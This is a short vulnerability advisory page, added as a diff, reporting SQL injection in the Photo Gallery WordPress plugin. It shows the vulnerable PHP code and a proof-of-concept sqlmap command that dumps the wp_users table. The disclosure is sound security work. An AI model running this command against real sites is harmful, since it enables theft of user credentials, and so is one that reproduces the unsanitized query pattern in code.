@@ -1,0 +1,38 @@
+<html>
+    <head>
+        <link rel="stylesheet" type="text/css" href="/css/cjc.css" />
+        <title>cjc.im</title>
+    </head>
+    <body>
+    <div id="main">
+        <h2><a href="/">cjc.im</a>
+ / <a href="/advisories">advisories</a> / 0002</h2>
+<h1 id="sql-injection-in-photo-gallery-wordpress-plugin">SQL Injection in Photo Gallery Wordpress plugin</h1>
+<h3 id="credit">Credit</h3>
+<p>This vulnerability has been discovered and reported by Carl Clegg (carl(at)cjc(dot)im)</p>
+<h3 id="timeline">Timeline</h3>
+<ul>
+<li>2016-07-05: Vendor Notified</li>
+<li>2016-11-21 Advisory Published</li>
+</ul>
+<h3 id="product">Product</h3>
+<p>Photo Gallery is a cool responsive image gallery plugin with beautifully views. Which allows you to add unlimited count of images in your prefered format.</p>
+<h3 id="risk-severity-rating">Risk / Severity Rating</h3>
+<p>Not calculated</p>
+<h3 id="description-and-impact">Description and Impact</h3>
+<p>The file <code>AYS_Gall_Main.php</code>'s edit function fails to sanitize the gall_id url parameter, allowing SQL injection:</p>
+<pre><code>$ays_gallery_id = $_GET[&quot;gall_id&quot;];
+    $res = $wpdb-&gt;get_row(&quot;SELECT * FROM &quot;.$ays_gallery_table.&quot; WHERE id=&quot;.$ays_gallery_id.&quot;&quot;);</code></pre>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<p><code>sqlmap --cookie=&quot;&lt;insert Cookie here&gt;&quot; -u &quot;http://wp.site/wp-admin/admin.php?page=ays_gall_main&amp;gall_id=1&amp;action=edit&quot; --dbms=MYSQL -o -p &quot;gall_id&quot; --dump -T wp_users</code></p>
+<h3 id="solution">Solution</h3>
+<p>Disable the plugin until an upgrade is available</p>
+<h3 id="references">References</h3>
+<p>*SQLi <a href="https://www.owasp.org/index.php/SQL_Injection">here</a></p>
+<h3 id="legal">Legal</h3>
+<p>The information contained within this advisory is supplied &quot;as-is&quot; with no warranties or guarantees of fitness of use or otherwise.</p>
+        <br />
+        </div>
+        </div>
+    </body>
+</html>
